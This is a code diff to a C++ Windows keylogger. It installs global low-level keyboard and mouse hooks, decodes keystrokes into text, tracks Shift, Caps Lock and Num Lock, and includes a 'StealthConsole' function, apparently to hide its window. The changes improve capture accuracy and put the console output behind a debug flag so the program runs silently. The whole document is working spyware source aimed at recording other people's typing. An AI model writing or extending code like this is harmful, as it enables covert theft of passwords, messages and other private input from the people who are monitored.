@@ -2,6 +2,9 @@
 #include <windows.h>
 #include <winuser.h>
 
+//C Headers
+#include <stdio.h>
+
 #define DEBUG 1
 
 //Debug Headers
@@ -14,6 +17,7 @@ HHOOK mousehook;
 HHOOK keyboardhook;
 KBDLLHOOKSTRUCT kbd_struct;
 MSLLHOOKSTRUCT mouse_struct;
+
 
 //Callback functions
 LRESULT WINAPI HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam);
@@ -67,6 +71,7 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         static bool capslock = false;
         static bool shift = false;
+        static bool numlock = false;
         kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
         char str[0xFF] = {0};
         DWORD msg = 1;
@@ -74,8 +79,15 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
         //Bits position from docs
         msg += (kbd_struct.scanCode << 16);
-        msg += (kbd_struct.flags << 24);
-        GetKeyNameText(msg, str, 0xFF);        
+        if (kbd_struct.vkCode == 0xA1) {
+            msg += ((kbd_struct.flags^LLKHF_EXTENDED) << 24);
+        }
+        else {
+            msg += (kbd_struct.flags << 24);
+        }
+        GetKeyNameText(msg, str, 0xFF);
+        // std::cout << "DEBUG:\t" << str << "\tvk:\t" << kbd_struct.vkCode << "\tscan:\t" << kbd_struct.scanCode << "\tflag:\t" << kbd_struct.flags << "\n";   
+        // std::cout << "TEST:\t" << (kbd_struct.flags & LLKHF_EXTENDED) << /*"\txor:\t" << (kbd_struct.flags ^ LLKHF_EXTENDED) <<*/ "\n";    
 
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             // std::cout << "\nDEBUG: " << str << "\n Caps: " << capslock << "\n Shift: " << shift << "\n";
@@ -85,11 +97,14 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                 if (strcmp(str, "Caps Lock") == 0) {
                     capslock = !capslock;
                 }
-                else if (strcmp(str, "Shift") == 0) {   // RIGHT SHIFT NOT WORKING
+                else if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {   // RIGHT SHIFT NOT WORKING
                     shift = true;
                 }
+                else if (strcmp(str, "Num Lock") == 0) {
+                    numlock = !numlock;
+                }
 
-                if (strcmp(str, "Enter") == 0) {
+                if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
                     strncpy(str, "\n", 0xFF);
                     printable = true;
                 }
@@ -110,22 +125,27 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
             if (printable) {
                 if (shift == capslock) {
-                    for (int i = 0; i < strlen(str); ++i) {
-                        str[i] = tolower(str[i]);
-                    }
+                    str[0] = tolower(str[0]);
+                    // for (int i = 0; i < strlen(str); ++i) {
+                    //     std::cout << "\n" << strlen(str) << " and " << str << "\n";
+                    //     str[i] = tolower(str[i]);
+                    // }
                 }
                 else {
-                    for (int i = 0; i < strlen(str); ++i) {
-                        str[i] = toupper(str[i]);
-                    }
+                    str[0] = toupper(str[0]);
+                    // for (int i = 0; i < strlen(str); ++i) {
+                    //     std::cout << "\n" << strlen(str) << " and " << str << "\n";
+                    //     str[i] = toupper(str[i]);
+                    // }
                 }
             }
-
+#ifdef DEBUG
             std::cout << str;
+#endif
             // char c = MapVirtualKey(kbd_struct.vkCode, 2);
         }
         else if(wParam == WM_KEYUP) {
-            if (strcmp(str, "Shift") == 0) {
+            if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                 shift = false;
             }
         }
@@ -148,13 +168,17 @@ void StealthConsole() {
 
 void SetMouseHook() {
     if (!(mousehook = SetWindowsHookEx(WH_MOUSE_LL, HookMouseCallback, NULL, 0))) {
+#ifdef DEBUG
         std::cout << "Failed to install mouse hook!\n";
+#endif
     }
 }
 
 void SetKeyboardHook() {
     if (!(keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, NULL, 0))) {
+#ifdef DEBUG
         std::cout << "Failed to install keyboard hook!\n";
+#endif
     }
 }
 
